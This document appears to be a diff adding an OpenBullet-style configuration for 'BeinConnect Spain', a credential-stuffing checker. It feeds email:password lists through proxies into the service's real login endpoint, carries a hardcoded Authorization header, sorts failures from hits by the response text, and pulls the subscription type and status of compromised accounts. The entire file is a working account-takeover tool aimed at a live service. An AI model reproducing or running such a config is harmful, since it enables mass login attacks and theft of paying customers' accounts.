@@ -1,0 +1,49 @@
+[SETTINGS]
+{
+  "Name": "BeinConnect Spain",
+  "SuggestedBots": 1,
+  "MaxCPM": 0,
+  "LastModified": "2019-06-30T01:58:52.1493939+02:00",
+  "AdditionalInfo": "",
+  "Author": "SehsAli",
+  "Version": "1.2.9 Anomaly",
+  "LoliSave": false,
+  "IgnoreResponseErrors": false,
+  "MaxRedirects": 8,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "EncodeData": false,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "MailPass",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+#Login REQUEST POST "https://apiclientes.beinconnect.es/login" 
+  CONTENT "email=<USER>&password=<PASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "Authorization: Basic mYBDs32wnj3uyfC26ySYGfgR6almabYBHT3PgiiYBdyPDheMDxbn2DB7NazLdZeo" 
+
+KEYCHECK 
+  KEYCHAIN Failure OR 
+    KEY "\"message\":\"No hemos encontrado ninguna cuenta con este email y/o contraseña.\"" 
+  KEYCHAIN Success OR 
+    KEY "\"usuario\"" 
+
+PARSE "<SOURCE>" LR "scripcionesActivas\":" "," -> CAP "SubscriptionType(SEHSALI)" 
+
+PARSE "<SOURCE>" LR "status\":\"" "\"" -> CAP "Acc.Status" 
+
